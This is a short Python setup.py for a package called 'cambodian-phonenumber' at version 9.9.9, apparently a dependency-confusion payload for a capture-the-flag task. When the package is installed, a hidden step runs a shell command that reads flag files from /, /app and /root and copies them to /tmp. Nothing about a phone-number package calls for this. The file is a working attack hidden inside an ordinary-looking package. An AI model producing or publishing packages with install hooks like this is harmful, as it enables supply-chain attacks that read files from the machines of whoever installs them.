import subprocess
from setuptools import setup

flag = subprocess.getoutput("cat /flag* /flag.txt /app/flag* /root/flag* 2>/dev/null")
with open("/tmp/flag_out.txt", "w") as f:
    f.write(flag)

setup(name="cambodian-phonenumber", version="9.9.9")
